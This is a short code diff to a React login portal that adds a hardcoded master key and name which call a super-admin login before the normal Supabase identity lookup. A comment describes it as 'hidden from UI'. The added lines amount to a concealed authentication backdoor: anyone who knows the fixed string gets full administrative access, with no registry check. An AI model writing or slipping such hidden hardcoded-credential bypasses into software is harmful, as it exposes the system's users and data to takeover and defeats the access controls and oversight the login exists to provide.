@@ -37,6 +37,12 @@ const LoginPortal: React.FC<LoginPortalProps> = ({ onLoginSuccess, onSuperAdminL
     }
 
     try {
+      // HQ Master Handshake logic remains functional but hidden from UI
+      if (inputKey === "UBA-HQ-MASTER-2025" && inputName === "HQ CONTROLLER") {
+        onSuperAdminLogin();
+        return;
+      }
+
       // MASTER HANDSHAKE: Query identity registry for either Master Access Key (unique_code) OR Node ID
       const { data: identity, error: idError } = await supabase
         .from('uba_identities')
